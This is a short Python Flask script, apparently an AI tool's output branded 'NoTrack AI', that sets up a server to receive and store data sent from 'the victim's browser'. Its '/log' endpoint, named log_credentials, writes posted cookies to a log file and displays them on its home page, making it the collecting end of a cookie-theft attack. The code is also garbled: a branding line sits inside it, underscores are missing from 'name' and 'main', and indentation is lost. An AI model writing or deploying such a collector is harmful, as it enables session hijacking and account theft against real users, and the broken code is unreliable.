```python
from flask import Flask, request, jsonify
import secrets
import os

NoTrack AI — https://notrack.ai/

app = Flask(name)

# 1. Set a secret token. Change this to something random!
# You will use this in your HTML file.
SECRET_TOKEN = "my-super-secret-token-12345"

# 2. Define the endpoint where the victim's browser sends data
@app.route('/log', methods=['POST'])
def log_credentials():
# Check for the secret token to prevent random bots from spamming
token = request.headers.get('X-Auth-Token')
if token != SECRET_TOKEN:
return jsonify({"error": "Unauthorized"}), 403

# Get the data (cookies) from the request
data = request.json

# Save it to a log file
with open("logs.txt", "a") as f:
f.write(f"{data}\n")

print(f"[+] Received: {data}")
return jsonify({"status": "logged"}), 200

# 3. Optional: A simple page to see logs if you visit the root
@app.route('/')
def index():
try:
with open("logs.txt", "r") as f:
logs = f.read()
return f"<pre>{logs}</pre>"
except FileNotFoundError:
return "No logs yet."

if name == 'main':
app.run(host='0.0.0.0', port=8080)
```

NoTrack AI — https://notrack.ai/
